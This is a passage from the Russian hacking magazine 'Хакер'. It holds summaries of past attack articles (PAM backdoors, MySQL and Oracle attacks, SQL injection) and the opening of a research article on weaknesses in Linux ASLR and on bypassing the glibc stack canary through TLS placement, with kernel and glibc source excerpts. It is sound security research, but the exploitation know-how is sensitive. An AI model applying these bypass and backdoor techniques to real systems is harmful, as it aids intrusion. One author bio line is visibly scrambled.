в качестве основы сети или как минимум ядра будут использоваться ком‐
мутаторы и маршрутизаторы это го производителя. Логично, что и любая кри‐
тическая ошибка в их прошивке может поставить под угрозу нормальную
работу и связность не только корпоративной сети, но и особо важных сег‐
ментов интернета. В статье рас ска зано о нескольких уязвимостях Cisco,
о которых ты просто обязан знать, — от взлома маршрутизатора по SNMP
до слива паролей через GRE‐туннель.


ТРЮКИ С BLUETOOTH. МАЛЕНЬКИЕ ХИТРОСТИ ИСПОЛЬЗОВАНИЯ
«СИНЕГО ЗУБА»





                       Скачать PDF

  В старые времена, ког да у каждого на телефоне не было практичес ки без‐
лимитного интернета, народ активно обменивался файлами по блютусу.
Голубой зуб не побежден и сейчас, прос то теперь у него несколько иное
предназначение — коммуника ция меж ду различны ми носимыми приборами
и в мире интернета вещей.
   Что все это означает для хакера? Имея при себе нужный инстру мент
на смартфоне или планшете, можно творить настоящие чудеса — перех‐
ватываем удаленку и управляем чужим девайсом, снифаем трафик, находим
невидимые устройства и даже DDoS’им обна руженные рядом устройства.


МАСТЕР-КЛАСС ПО РЕАНИМАЦИИ НИКСОВ. МЕТОДЫ БОРЬБЫ СО
СБОЯМИ LINUX И FREEBSD





                       Скачать PDF

   UNIX давно себя зарекомендовали как системы надежные и предска‐
зуемые. Но бывает, что пос ле системной ошиб ки или другого сбоя даль‐
нейшая судьба операционки полностью зависит от квалификации ее владель‐
ца. Дизайн UNIX настоль ко прост и пря молинеен, что ОС можно поднять
с колен, в каком бы состоянии она ни находи лась. В материале рассмотрены
самые типовые и часто встречающиеся ситуации крушения *NIX‐систем:
затертая запись MBR и забытый пароль root, подвисания и самопроизволь‐
ная перезагрузка ОС, паника ядра, выход из строя жесткого диска, неп‐
равильная настрой ка xorg.conf, отсутству ющий видеодрайвер, неправильная
настройка сетевых интерфейсов, неработающий DNS‐резолвинг — и при‐
ведены рецепты их устранения и вос становления работоспособности.


КАК СТАТЬ SSH’АСТЛИВЫМ. FULL-GUIDE ПО ИСПОЛЬЗОВАНИЮ
SECURE SHELL





                       Скачать PDF

  SSH — де‐факто самый популярный и час то используемый протокол уда‐
ленного доступа к Linux. Нужно ли говорить о степени надежности и безопас‐
ности протокола, по которому к серверу подклю чается администратор?
Но помимо настроек безопас ности, SSH имеет еще кучу опций, которые сде‐
лают работу в терминале более комфортной, приятной и быс трой. В статье
собран самый пол ный мануал по пра вильному использованию Secure Shell
на все сто.


ПОРОЧНОЕ НАСЛЕДИЕ WINDOWS. КОНЦЕПТУАЛЬНЫЕ МЕТОДЫ
ВЗЛОМА LINUX ЧЕРЕЗ ФЛЕШКУ И ЗАЩИТА ОТ НИХ





                       Скачать PDF

   Какой юзер Windows не помнит траб лы с флешками и надоедливым
вирусом из Autorun? Пользователи Linux всегда смотрели на эту проблему
свысока, мол, их это не касается. Отчасти это так, но не все столь глад ко,
как хотелось бы. У пин гвина были свои проблемы — это .autorun, аналогичный
по функциональности, брешь Adobe Acrobat Reader со шриф тами, в резуль‐
тате которой в Nautilus’е можно запус тить что угодно, косячные драйверы,
некорректно обрабатывающие съемные носители, и фичи, позволяющие
обойти такие механизмы безопасности, как AppArmor, ASLR, PIE и NX‐биты.
Уже интересно? Тогда читай материал, и ты узнаешь, как это было.


*NIX-БЭКДОР БЫСТРОГО ПРИГОТОВЛЕНИЯ. ВНЕДРЯЕМСЯ В
СИСТЕМУ АУТЕНТИФИКАЦИИ LINUX, BSD И MACOS





                 Читать или скачать PDF

  После того как задача проникновения на машину была выполнена, необ‐
ходимо как‐то на ней закрепиться, не вызывая подоз рений. К при меру, соз‐
дать новый аккаунт или инфицировать жертву неким бэкдором, который,
как верный слуга, будет ждать от хозя ина команд на исполне ние. Несмотря
на то что *NIX‐системы гораздо безопас нее, чем другие платформы, есть
очень простой в реализации и достаточно скрытный метод, о котором знают
на удивление мало людей. Это модификация модулей системы аутентифика‐
ции PAM, которую используют все современные UNIX‐системы. В материале
дана теория по PAM‐модулям, пример С++ кода для написания собственного
бэкдора и приемы встраива ния его в легальные модули аутентификации.


АТАКИ НА TOMCAT. ИЗУЧАЕМ РАСПРОСТРАНЕННЫЕ МЕТОДЫ
АТАК НА APACHE TOMCAT И СПОСОБЫ ПРОТИВОДЕЙСТВИЯ ИМ





                 Читать или скачать PDF

   Apache Tomcat лидирует по количес тву инсталляций на серверы и рас‐
пространению в мире. Он занимает шес тую строчку по популярности среди
веб‐серверов в рейтинге W3Techs, что, конечно же, автоматически делает
его привлекательной мишенью для зло умышленни ков. Дефолтные настройки
не позволяют противос тоять рас простра ненным методам  атак, поэтому
в материале приведены конкретные рецепты и рекомендации, используемые
как для тестирования на воз можность взлома, так и для противодействия зло‐
умышленникам, покусившимся на твою святыню.


ИГРАЕМ МУСКУЛАМИ. МЕТОДЫ И СРЕДСТВА ВЗЛОМА БАЗ
ДАННЫХ MYSQL





                 Читать или скачать PDF

  Не секрет, что MySQL — одна из самых рас пространенных СУБД. Ее мож‐
но встретить пов сюду, именно поэто му безопас ность базы данных очень важ‐
на: если злоумышленник получил дос туп к базе, то высок риск, что не только
уйдет вся инфа, но и взломщик положит весь ресурс. В настоящем материале
актуальная информация по алгоритму взлома и пос тэксплуатации MySQL, все
наиболее часто используемые трюки и при емы, в том числе из арсенала пен‐
тестеров. Прочитав его, кто‐то еще раз повторит теорию, а кто‐то и почер‐
пнет что‐то новое. Так что дерзай!


АТАКА НА ОРАКУЛА. ПОДРОБНЫЙ ГАЙД ПО ВЕКТОРАМ АТАК НА
ORACLE DB





                 Читать или скачать PDF

   Стоит ли говорить, что Oracle — это топовая и широко используемая
СУБД? В ее недрах крутятся все самые ценные данные от финансовых тран‐
закций до результатов военных экспериментов или моделирования кос‐
мических объектов. Как и ее младший брат MySQL, эта СУБД — настоящий
лакомый кусок для хакера, да и любой пен тестер не обойдет ее стороной.
В статье приведены самые важные и наиболее типовые векторы атак на таб‐
лицы и программный код баз данных Oracle — взломы учетных записей поль‐
зователей, выпол нение про извольного кода, инжекты в запросы, баги пла‐
нировщика и мно гое другое. Все разделы снабжены наглядны ми иллюс тра‐
циями и примерами кода. Так что, если ты занима ешься пентестами и/или
интересуешься внутренним устройством Oracle, откры вай обя зательно.


ИНЪЕКЦИИ ВСЛЕПУЮ. ЭКЗОТИЧЕСКОЕ ИНЖЕКТИРОВАНИЕ
ГРУБЫМ МЕТОДОМ





                       Скачать PDF

  Иссле дуя тему безопас ности СУБД, наткнулся на старенький, но интерес‐
ный материал по исполь зованию инжектов в SQL‐запросы. В материале опи‐
саны фишки, которые могут когда‐нибудь тебе пригодиться на практике.
В самом начале статьи рассматриваются необходимые теоретичес кие осно‐
вы SQL, такие как функции и структура зап росов, далее иллюс трируются трю‐
ки использования с NULL, предзапро сов для выявления потенциальных дыр,
INSERT’ные трюки, и приводится общий при мер использования всего опи‐
санного арсенала. Натренировавшись на учеб ной БД с помощью этих при‐
емов, ты уже уве ренно можешь принимать ся за тес тирование реальной БД
практически на автомате, то есть, как ска зано в заголовке статьи, вслепую!


ЗАКЛЮЧЕНИЕ
Наша сегодняшняя подборка на этом подходит к концу. Мы постарались соб‐
рать для тебя самые интерес ные и практически зна чимые статьи из прошлых
выпусков «Хакера» на тему взло ма. Статья получилась огромной, но все отоб‐
ранные для нее публикации — лишь капля в море интерес ного ИБ‐контента.
Если ты найдешь что‐то занятное и реально полез ное — не забывай делиться
в комментах!
ВЗЛОМ

ПРЕДСКАЗАНИЕ
 СЛУЧАЙНОСТИ





    ИЗУЧАЕМ ASLR В LINUX И GNU LIBC,
    ОБХОДИМ ЗАЩИТУ АДРЕСНОГО
    ПРОСТРАНСТВА И STACK CANARY




За время сущес твования ядра Linux в нем
появилось множество механизмов защиты
от  эксплуатации  уязвимостей,  которые
могут обнаружиться как в самом ядре, так
и в приложениях пользователей. Это, в час‐               blackzert                                                                              Старший специалист по
тности, механизмы ASLR и stack canary,       безопасностиnologies, занимаетсяPositive Tech‐
противодействующие  эксплуата ции  уяз‐      поискомвыявитьуязвимостей.и устранитьПомог
вимостей в приложениях. В дан ной статье        компанийуязвимостиSAP,в продуктахSiemens,
                                                                                          Dahua. Участвует в
мы внимательно рассмотрим реализацию       подготовке международного
                                                                            форума Positive Hack Days.
ASLR в ядре текущей версии  (4.15‐rc1)
и  проблемы,   позволяющие   частично
или полностью обойти эту защиту.


Вместе с описанием проб лем мы предложили ряд исправлений и раз работа‐
ли специальную  утилиту, поз воляющую продемонс трировать найденные
недостатки. Анализируя механизм реализации ASLR, мы также проанализи‐
ровали часть библиотеки GNU Libc (glibc) и нашли серьезные проблемы
с реализацией stack canary. Уда лось обойти защиту stack canary и запустить
произвольный код через утилиту ldd.
  Все проблемы рассматриваются в контексте архи тектуры x86‐64, хотя
для большинства архитектур, поддерживаемых ядром Linux, они также акту‐
альны.





Илья Смит, выступая от лица компании Positive Technologies, представил док‐
лад по этой теме на конференции OﬀensiveCon, которая прошла 16 фев‐
раля 2018 года. На сайте конференции можно ознакомиться и с другими
брифами выступлений.



1. ASLR
ASLR (address space  layout randomization) — это технология, соз данная
для усложнения эксплуатации некоторого клас са уяз вимостей, применяется
в нескольких современных операционных системах. Основной принцип дан‐
ной технологии заключается в устра нении заведо мо известных атакующе му
адресов адресного прос транства процесса. В час тности, адресов, необ‐
ходимых для того, чтобы:
 • передать управле ние на исполня емый код;
 • построить цепоч ку ROP‐гаджетов (Return Oriented Programming);
 • прочитать (перезаписать) важные значения в памяти.

Впервые технология была реализова на для Linux в 2005 году. В Microsoft Win‐
dows и Mac OS реализация появилась в 2007 году. Хорошее опи сание реали‐
зации ASLR в Linux дается в статье.
  За время существования ASLR были соз даны разные методики обхода
этой технологии, среди которых можно выделить следующие типы:
 • «утечки адресов» — некоторые уязвимос ти позволяют злоумышленнику
   получать необходимые для атаки адреса, что и дает возможность обходить
  ASLR (Reed Hastings, Bob Joyce. Purify: Fast Detection of Memory Leaks
   and Access Errors);
 • относительная адресация — некото рые уяз вимос ти поз воляют злоумыш‐
   леннику получать доступ к данным отно сительно какого‐то адреса и за
   счет  этого обходить ASLR  (Improper  Restriction  of  Operations  within
   the Bounds of a Memory Buﬀer);
 • слабости реализации — некоторые уяз вимости позволяют злоумышленни‐
   ку угадать необходимые адреса из‐за малой энтропии или свой ств кон‐
   кретной реализации ASLR (AMD Bulldozer Linux ASLR weakness: Reducing
   entropy by 87.5%);
 • побочные эффекты работы аппарату ры — осо бенности работы процес‐
   сора, позволяющие обойти ASLR (Dmitry Evtyushkin, Dmitry Ponomarev, Nael
   Abu‐Ghazaleh. Jump Over ASLR: Attacking Branch Predictors to Bypass ASLR).

Стоит отметить, что в разных ОС реализации ASLR очень сильно различаются
и развиваются. Последние изменения связаны с работой Oﬀset2lib, пред‐
ставленной в 2014 году. В ней были рас кры ты слабости реализации, позволя‐
ющие обходить ASLR из‐за близ кого расположения всех биб лиотек к образу
бинарного ELF‐файла программы. В качестве решения было пред ложено
выделить образ ELF‐файла приложения в отдель ный случайным образом
выделенный регион.
  В апреле 2016 года создатели Oﬀset2lib раскритиковали также текущую
реализацию, выделив недос таточную энтропию при выборе адреса региона
в работе ASLR‐NG. Одна ко с тех пор патч не был опуб ликован.
   Рассмотрим результат работы ASLR в Linux на текущий момент.


2. ASLR В LINUX
Для первоначального опыта возьмем Ubuntu 16.04.3 LTS (GNU/Linux 4.10.0‐
40‐generic  x86_64) с  уста новленными последними на текущий момент
обновлениями. Результат не силь но будет зависеть от дистрибутива Linux
и версии ядра начиная с 3.18‐rc7. Если выполнить less /proc/self/maps
в командной строке Linux, можно увидеть примерно следующее.





На примере видно:
 • базовый адрес бинарного приложения (в нашем слу чае /bin/less) выб‐
   ран как 5627a82bf000 ;
 • адрес начала кучи (heap) выбран как 5627aa2d4000, что есть адрес кон‐
   ца бинарного приложения плюс некоторое слу чайное значение, в нашем
   случае равное 1de7000  (5627aa2d4000 – 5627a84ed000 ). Адрес
                  12   выровнен на 2  из‐за архитектурных особенностей x86‐64;
 • адрес 7f3631293000 выб ран как mmap_base, этот адрес будет мак‐
   симально возможной старшей гра ницей при выборе «случайного» адреса
   для любого выделения памяти с помощью системного вызова mmap;
 • библиотеки  ld2.23.so ,  libtinfo.so.5.9 ,  libc2.23.so  рас‐
   положены подряд.

Если применить вычитание к соседним регионам памяти, можно заметить:
существенна разница между бинарным файлом, кучей, стеком и младшим
адресом local‐archive и старшим адресом ld. Меж ду загруженными библиоте‐
ками (файлами) нет ни одной сво бодной стра ницы.
   Если повторить процеду ру много раз, картина сильно не изме нится: раз‐
ность между страницами будет отличаться, однако библиотеки и файлы будут
одинаково расположены друг относительно друга. Этот факт и стал опорной
точкой для данной статьи.


3. ПОЧЕМУ ЭТО ТАК
Рассмотрим, как работа ет механизм выделения виртуальной памяти процес‐
са. Вся логика находится в функции ядра do_mmap, реализующей выделение
памяти как со стороны пользователя (syscall mmap), так и со стороны ядра
(при выполнении execve). Она раз деляется на два дей ствия — сначала выбор
свободного подходящего адреса (get_unmapped_area), потом отоб ражение
страниц на выбранный адрес (mmap_region). Нам будет интересен первый
этап.
  В выборе адреса воз можны варианты:
 1. Если выставлен флаг MAP_FIXED, то в качестве адреса вер нется зна‐
   чение аргумента addr.
 2. Если значение аргумента addr отлично от нуля, оно используется как «под‐
   сказка», и в некото рых случаях будет выб рано именно это значение.
 3. В качестве адреса будет выбран наибольший адрес свободного реги она,
   подходящий по длине и лежащий в допус тимом диапазоне выбираемых
   адресов.
 4. Адрес проверяется на ограничения, связанные с безопас ностью (к этому
   вернемся позднее, раздел 7.3).

Если все прошло успешно, по выб ранному адресу будет выделен необ‐
ходимый регион памяти.


Де тали алго ритма выбора адре са
В  основе  менеджера  виртуальной  памяти  про цесса  лежит  структура
vm_area_struct (далее просто vma):


struct vm_area_struct {
    unsigned long vm_start; /* Our start address within vm_mm. */
    unsigned long vm_end; /* The first byte after our end address
within vm_mm. */
    ...
    /* linked list of VM areas per task, sorted by address */
    struct vm_area_struct *vm_next, *vm_prev;
    struct rb_node vm_rb;
    ...
    pgprot_t vm_page_prot; /* Access permissions of this VMA. */
    ...
};

Эта структура описывает начало региона вир туаль ной памяти, конец реги она
и флаги доступа к входящим в регион страницам.
  Vma организованы в двусвязный список (Doubly linked list) по возрастанию
адресов начала региона. И в расширенное красно‐черное дерево  (Bayer,
Rudolf. Symmetric binary B‐Trees: Data structure and maintenance algorithms),
также по возрастанию адресов начала региона. Хорошее обоснование этому
решению дается самими разработ чиками ядра (Lespinasse, Michel. Mm: use
augmented rbtrees for ﬁnding unmapped areas).





     Пример двусвязного спис ка vma в порядке возрастания адресов

Расширением красно‐черного дерева является величина свободной памяти
для рассматриваемого узла. Величина свободной памяти узла определяется
как максимум:
 • из разности между началом текущей vma и кон цом ее предшественника
   в двусвязном списке по возраста нию;
 • величины сво бодной памяти левого поддерева;
 • величины сво бодной памяти пра вого поддерева.

Выбранная структура поз воляет быстро (за O(log n)) находить vma, соот ветс‐
твующий искомому адресу, или выбирать свободный диапазон опре деленной
длины.
  При выборе адреса вводятся также две важные границы — минимально
возможное нижнее значение и максимально возможное верхнее. Нижнее
определяется архитектурой как минимальный допустимый адрес или как
минимальное  разрешенное  админис тратором  системы.  Верхнее —
mmap_base — выбирается как stack – random, где stack — это выб ранный
максимальный адрес  стека, random — некоторое  случайное значение
с энтропией от 28 до 32 бит в зависимос ти от соответству ющих параметров
ядра. Ядро Linux не может выбрать адрес выше mmap_base. В адресном
пространстве процесса адреса, превыша ющие mmap_base, либо соответс‐
твуют стеку и специальным системным регионам —  vvar и vdso, либо
не используются никогда, если только не будут явно выделены с флагом
MMAP_FIXED.





          Пример рас ширенного крас но‐черного дерева vma

Во всей схе ме неизвестны адрес начала стека главного потока, базовый
адрес загрузки бинарного файла приложения, начальный адрес кучи при‐
ложения и mmap_base — стартовый адрес выделения памяти с помощью
mmap.


4. ПОЧЕМУ ЭТО ПЛОХО
Можно обозначить несколько проблем, которые следуют из опи санного алго‐
ритма выделе ния памяти.


4.1. Близ кое расположе ние памяти
Во время работы приложение использует вир туаль ную оперативную память.
Распространенные примеры использования при ложением памяти — это куча,
код и данные (.rodata, .bss) загруженных модулей, стеки потоков, подгружен‐
ные файлы. Любая ошиб ка обработки данных, лежащих в этих страницах,
может затронуть и близлежащие данные. Чем больше разнородных страниц
находятся рядом, тем больше поверхность атаки и выше вероятность
успешной эксплуатации.
  Примеры таких ошибок — ошибки с обра боткой границ (out‐of‐bounds),
переполнения целочисленные (Integer Overﬂow or Wraparound) или буфера
(Classic Buﬀer Overﬂow), ошибки обработки типов (Incorrect Type Conversion
or Cast).
   Частный случай этой проблемы — уяз вимость для Oﬀset2lib‐атаки. Вкрат‐
це: проблема заключалась в том, что базовый адрес загрузки программы
не выделялся отдельно от библиотек, а выбирался ядром как mmap_base.
Если в приложе нии была уяз вимость, экс плуатация упрощалась близким рас‐
положением образов загруженных библиотек к обра зу загруженного бинар‐
ного приложения.
   Очень хорошим примером, демонстри рующим данную проблему, была
уязвимость в PHP (CVE‐2014‐9427), позволя ющая читать или изменять сосед‐
ние регионы памяти.
  В разделе 5 будет несколько примеров.


4.2. Де терминиро ван ный метод загрузки биб лиотек
Динамические  библиотеки  в ОС  Linux  заг ружа ются  почти  пол ностью
без обращения к ядру Linux. За это отвечает биб лиотека ld (из GNU Libc).
Единственное участие ядра — через функцию mmap (open/stat и прочие фай‐
ловые операции мы пока не учитыва ем): это нуж но для загрузки кода и данных
библиотеки в адресное пространс тво процес са. Исключение составляет
сама библиотека ld, которая обычно про писа на в исполняемом ELF‐файле
программы как интерпретатор для загрузки файла. Сам же интерпретатор
грузится ядром.
   Итак, если в качестве интерпретатора используется ld из GNU Libc, то про‐
исходит загрузка библиотек пример но следующим образом:
 1. В очередь обрабатываемых файлов добавляется ELF‐файл программы.
 2. Из очереди обрабатываемых файлов изымает ся первый ELF‐файл (FIFO).
 3. Если файл еще не загружен в адресное прос транство процесса, он гру‐
   зится при помощи mmap.
 4. Каждая необходимая библиотека для рас сматриваемого файла добав‐
   ляется в очередь обра батываемых фай лов.
 5. Пока очередь не пуста — следует повторять пункт 2.

Из этого алгоритма следует, что порядок загрузки всегда опре делен и может
быть повторен, если извес тны все необходимые библиоте ки (их бинарные
файлы). Это позволяет восста новить адреса всех библиотек, если известен
адрес хотя бы одной из них:
 1. Допустим, известен адрес библиотеки libc.
 2. Добавим длину библиотеки libc к адресу загрузки libc — и получим адрес
   загрузки библиотеки, загруженной до libc.
 3. Продолжив  вычисления  подобным  образом,  получим   значения
  mmap_base и адреса библиотек, загруженных до libc.
 4. Вычтем из адреса libc длину библиотеки, загруженной после libc. Получим
   адрес библиотеки, заг руженной после libc.
 5. Продолжив вычисления подобным обра зом, получим адреса всех биб‐
   лиотек, загруженных при старте прог раммы с помощью интерпретатора ld.

Если библиотека была загружена во время работы программы (например,
с помощью функции dlopen), ее положение отно сительно дру гих библиотек
может быть неизвестным зло умышленнику в некоторых случаях. Например,
если были вызовы mmap с неизвестными злоумышленнику размерами
выделяемых регионов памяти.
  При эксплуатации уяз вимос тей зна ние адресов биб лиотек очень сильно
помогает, например в поиске «гаджетов» при построении ROP‐цепочек. Кро‐
ме того, любая уязвимость в любой из библиотек, позволяющая читать
(писать) значения отно сительно адреса этой биб лиотеки, будет легко проэкс‐
плуатирована из‐за того, что библиотеки идут друг за другом.
   Большинство дистрибутивов Linux содержат скомпилированные пакеты
с наиболее распространенными библиотеками (например, libc). Благодаря
этому можно узнать длину библиотек и построить часть картины рас пределе‐
ния виртуального адресного пространс тва процесса в описанном выше слу‐
чае.
   Теоретически можно пос троить большую базу, например для дистрибути‐
ва Ubuntu, содержащую версии библиотек ld, libc, libpthread, libm и так далее,
причем для каждой версии одной из биб лиотек можно определить множес тво
версий библиотек, для нее необходимых (зависимос ти). Таким образом мож‐
но построить возможные варианты карт рас пределе ния час ти адресного
пространства про цесса при извес тном адресе одной из библиотек.
  Примерами подобных баз служат базы libcdb.com и libc.blukat.me, исполь‐
зуемые для определе ния версий libc по смещениям до извес тных функций.
  Из всего описанного следует, что детерминированный порядок загрузки
библиотек представляет собой проб лему безопасности приложе ний, и зна‐
чение ее увеличивается вмес те с описанным ранее поведением mmap. В ОС
Android эта проблема исправлена с 7‐й версии (Security Enhancements in An‐
droid 7.0, Implement Library Load Order Randomization).


4.3. Де терминиро ван ный порядок выпол нения
Рассмотрим следующее свойство программ: сущес твует пара определенных
точек в потоке выполнения программы, меж ду которы ми состояние прог‐
раммы в интересующих нас данных определено. Например, когда клиент
соединяется с сетевым сервисом, пос ледний выделяет для клиента некото‐
рые ресурсы. Часть этих ресурсов может быть выделена из кучи приложения.
При этом взаимное рас положение объектов на куче определено в большинс‐
тве случаев.
   Это свойство исполь зуется во время эксплуата ции приложений при пос‐
троении необходимого состояния программы. Назовем его детерминирован‐
ным порядком выполнения.
   Частный случай этого свойства есть некото рая определенная точка
в потоке выполнения программы, состояние которой (точки) с начала выпол‐
нения программы, от запуска к запуску, идентично за исключением отдельных
переменных. Например, до выполнения функции main программы интерпре‐
татор ld должен загрузить и инициализировать все библиоте ки и выполнить
инициализацию программы. Расположение биб лиотек друг относительно
друга, как было отмечено в разделе 4.2, будет всегда одинаковым. Отличия
на момент выполнения функции main будут в конкретных адресах загрузки
программы, библиотек, стека, кучи и выделен ных к этому моменту в памяти
объектов. Различия обусловлены рандомизацией, описанной в разделе 6.
   Благодаря этому свойству зло умыш ленник может получить информацию
о взаимном расположении данных прог раммы. Это рас положение не будет
зависеть от рандомизации адресного прос транства процесса.
   Единственная возможная на этом этапе энтро пия может быть обусловлена
конкуренцией потоков: если программа создаст нес колько потоков, их кон‐
куренция при работе с данными может вносить энтропию в рас положе ние
объектов. В рассматриваемом примере соз дание потоков до выполнения
main возможно из глобальных конс трукторов программы или необходимых ей
библиотек.
   Когда программа начнет использовать кучу и выделять память в ней (обыч‐
но с помощью new/malloc), расположение объектов в куче друг относительно
друга также до определенного момента будет постоянным для каждого
запуска.
  В некоторых случаях рас положение стеков потоков и  куч, соз данных
для них, будет также предска зуемо отно сительно адресов биб лиотек.
  При необходимости мож но получить эти смещения, чтобы использовать
при эксплуатации. Например, выполнив strace ‐e mmap для данного при‐
ложения два раза и сравнив разницу в адресах.


4.4. Дырки
Если приложение после выделения памяти через mmap освобождает некото‐
рую ее часть, могут появлять ся «дырки» — свободные регионы памяти, окру‐
женные занятыми реги она ми. Проблемы могут возникнуть, если эта память
(дырка) будет сно ва выделена для уяз вимого объекта (объ екта, при обработ‐
ке которого в приложении есть уяз вимость). Это снова при водит к проблеме
близкого расположения объектов в памяти.
   Хороший пример соз дания таких дырок был обнаружен в коде загрузки
ELF‐файла в ядре Linux. Во время загрузки ELF‐фай ла ядро сначала счи тыва‐
ет полный размер загружа емого файла и пытается отобразить файл целиком
с помощью do_mmap. После успешной загрузки файла целиком вся память
после первого сегмента освобождает ся. Все следующие сегменты загружа‐
ются по фиксированному адресу (MAP_FIXED), полученному относительно
первого сегмента. Это нужно для того, чтобы можно было загрузить весь
файл по выбранному адресу и раз делить сегменты по правам и сме щениям
в соответствии с их описаниями в ELF‐файле. Такой под ход позволяет порож‐
дать дырки в памяти, если они были определены в ELF‐файле между сег‐
ментами.
  При загрузке же ELF‐файла интерпретатором ld (GNU Libc) — в такой же
ситуации — не вызывает unmap, а меня ет раз решения на свободные стра‐
ницы (дырки) на PROT_NONE, обес печивая тем самым запрет доступа про‐
цесса к этим страницам. Этот подход более безопасный.
  Для устранения проб лемы загрузки ELF‐файла, содержащего дырки,
ядром Linux был предложен патч, реали зующий логику как в ld из GNU Libc
(см. раздел 7.1).


4.5. TLS и стек потока
TLS (Thread Local Storage) — это механизм, с помощью которого каждый
поток в многопоточ ном про цес се может выделять рас положения для хра‐
нения данных (Thread‐Local Storage). Реализация этого механизма различна
для разных архитектур и операционных систем, в нашем же случае это реали‐
зация glibc под x86‐64. Для x86 разница будет несущественная для рассмат‐
риваемой проблематики mmap.
  В случае с glibc для создания TLS потока также используется mmap.
Это означает, что TLS потока выбирается уже описанным образом и при
близком расположении к уяз вимому объекту может быть изменен.
  Чем интересен TLS? В реализации glibc на TLS указывает сегментный
регистр fs (для архитектуры x86‐64). Его структуру описывает тип tcbhead_t,
определенный в исходных файлах glibc:


typedef struct
{
  void *tcb;          /* Pointer to the TCB.  Not necessarily the
                         thread descriptor used by libpthread.  */
  dtv_t *dtv;
  void *self;         /* Pointer to the thread descriptor.  */
  int multiple_threads;
  int gscope_flag;
  uintptr_t sysinfo;
  uintptr_t stack_guard;
  uintptr_t pointer_guard;
  ...
} tcbhead_t;

Этот тип содер жит поле stack_guard, хра нящее так называемую «канарей‐
ку» — некоторое случайное (или псевдослучайное) число, позволяющее
защищать приложение от переполнений буфера на стеке (One, Aleph. Smash‐
ing The Stack For Fun And Proﬁt).
  Защита работает следующим обра зом: при вхо де в функцию на стек кла‐
дется «канарейка», которая берется из tcbhead_t.stack_guard. В конце фун‐
кции значение на стеке сравнивается с эталонным значением в tcbhead_t.s‐
tack_guard, и, если оно не совпада ет, приложение будет завершено с ошиб‐
кой.
  Известны следующие методы обхода:
 • если  злоумышленнику  необязатель но  перезаписывать  это  значение
    (Fritsch, Hagen. Buﬀer overﬂows on linux‐x86‐64);
 • если злоумышленнику удастся прочитать или предугадать это значение,
   у него появится возможность успешно провести атаку (там же);
 • если злоумышленник может перезаписать это зна чение на известное, он
   также  получит  возможность успешно провес ти  атаку  переполнения
  буфера на стеке (там же);
 • если злоумыш ленник может перехватить управление до того, как приложе‐
   ние будет завершено (Litchﬁeld, David. Defeating the Stack Based Buﬀer
   Overﬂow Prevention).

Из описанного следует важность защиты TLS от чтения или перезаписи зло‐
умышленником.
  Во время данного исследования была обна ружена проблема в реали‐
зации TLS  у  glibc для  потоков, созданных с помощью  pthread_create.
Для нового потока необ ходимо выб рать TLS. Glibc после выделения памяти
под стек инициализирует TLS в старших адресах этой памяти. В рас сматрива‐
емой архитектуре x86‐64 стек растет вниз, а значит, TLS оказывается в вер‐
шине стека. Отступив некоторое константное значение от TLS, мы получим
значение, исполь зуемое новым потоком для регис тра стека. Расстояние
от TLS до стек фрейма функции, переданной аргу ментом в pthread_create,
меньше одной страницы. Зло умышленни ку уже необязательно угадывать
или «подглядывать» значение «канарейки», он поп росту может перезаписать
эталонное значение вместе со значени ем в стеке и обойти эту защиту пол‐
ностью. Подобная проб лема была найдена в Intel ME (Maxim Goryachy, Mark
Ermolov. HOW TO HACK A TURNED‐OFF COMPUTER, OR RUNNING).


4.6. Malloc и mmap
При использовании malloc в некото рых случаях  glibc применя ет mmap
для выделения новых учас тков памяти — если размер запрашиваемой памяти
больше некоторой величины. В случае выделения памяти с помощью mmap
адрес после выделе ния будет находиться «рядом» с библиоте ками или дру‐
гими данными, выделенными mmap. В этих случаях внимание злоумышленни‐
ка привлекают ошибки обра бот ки объектов на куче, такие как перепол нение
кучи, use after free и type confusion.
  Интересное поведение библиотеки glibc было замечено, когда программа
использует pthread_create. При первом вызове malloc из потока, соз данного
pthread_creaete, glibc вызовет mmap, что бы создать новую кучу для этого
потока. В этом случае все выделен ные с помощью malloc адреса в потоке
будут находиться недалеко от стека это го же потока. Подробнее этот случай
будет рассмотрен в разделе 5.7.
  Некоторые программы и библиотеки используют mmap для отображения
файлов в адресное пространс тво процесса. Эти файлы могут быть исполь‐
зованы, например, как кеш или для быстрого сохранения (изменения) данных
на диске.
  Абстрактный пример: пусть приложение загружа ет MP3‐файл с помощью
mmap. Адрес загрузки назовем mmap_mp3. Дальше оно считывает из заг‐
руженных данных смещение до начала зву ковых данных oﬀset. Пусть в при‐
ложении присутствует ошибка проверки длины полученного значения. Тогда
злоумышленник  может  подготовить  специальным  образом  MP3‐файл
и получить доступ к региону памяти, расположенному после mmap_mp3.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
      ПРЕДСКАЗАНИЕ
       СЛУЧАЙНОСТИ
                 ИЗУЧАЕМ ASLR В LINUX И GNU LIBC,
                 ОБХОДИМ ЗАЩИТУ АДРЕСНОГО
                   ПРОСТРАНСТВА И STACK CANARY





4.7. MAP_FIXED и загрузка ET_DYN ELF-файлов
В мануале mmap для флага MAP_FIXED написа но следующее:



      MAP_FIXED
          Don’t interpret addr as a hint: place the mapping at exactly that ad-
       dress. addr must be a multiple of the page size.  If the memory region
       specified by addr and len overlaps pages of any existing mapping(s), then
       the overlapped part of the existing mapping(s)  will be discarded.  If the
       specified address cannot be used, mmap()  will  fail. Because requiring
      a fixed address for a mapping  is less portable, the use of this option
         is discouraged.

Если запрашиваемый регион с флагом MAP_FIXED перекрывает уже сущес‐
твующие регионы, результат успешного выполнения mmap перепишет сущес‐
твующие регионы.
   Таким образом, если прог раммист допускает ошибку в работе с MAP_-
FIXED, возможно переопределение регионов памяти.
  Интересный пример такой ошибки был найден в контексте данной работы
как в ядре Linux, так и в glibc.
   Есть требование к ELF‐файлам: сег менты ELF‐файла должны следовать
в заголовке Phdr в порядке возрастания адресов vaddr:



     PT_LOAD
        The array element specifies a loadable segment, described by p_filesz
      and p_memsz. The bytes from the file are mapped to the beginning of the
     memory segment. If the segment’s memory size (p_memsz) is larger than
       the  file size (p_filesz), the “extra” bytes are defined to hold the value 0
      and to follow the segment’s initialized area. The file size may not be larger
       than the memory size. Loadable segment entries in the program header
       table appear in ascending order, sorted on the p_vaddr member.

Однако это требование не проверяется. Текущий код загрузки ELF‐файла
таков:


case PT_LOAD:
    struct loadcmd *c = &loadcmds[nloadcmds++];
    c‐>mapstart = ALIGN_DOWN (ph‐>p_vaddr, GLRO(dl_pagesize));
    c‐>mapend = ALIGN_UP (ph‐>p_vaddr + ph‐>p_filesz, GLRO(dl_pag
esize));
...
